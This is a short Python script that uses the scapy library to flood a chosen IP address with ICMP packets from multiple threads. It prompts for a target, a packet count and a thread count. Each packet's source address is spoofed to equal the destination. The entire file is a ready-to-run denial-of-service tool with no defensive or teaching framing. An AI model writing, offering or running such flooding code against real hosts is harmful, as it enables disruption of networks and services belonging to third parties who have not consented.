import concurrent.futures
import os
from scapy.all import IP, ICMP, send

def icmp_flood(dst_ip, cycles):
    packet = IP(src=dst_ip, dst=dst_ip) / ICMP()  
    for _ in range(cycles):
        send(packet, verbose=False)

def main():
    os.system("clear")
    target = input("Destination IP: ")
    total_packets = int(input("How many packets: "))
    thread_count = int(input("How many threads: "))

    packets_per_thread = total_packets // thread_count
    remaining_packets = total_packets % thread_count

    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = []

        for i in range(thread_count):
            cycles = packets_per_thread + (1 if i < remaining_packets else 0)
            futures.append(executor.submit(icmp_flood, target, cycles))

        for future in concurrent.futures.as_completed(futures):
            future.result()  

if __name__ == '__main__':
    main()
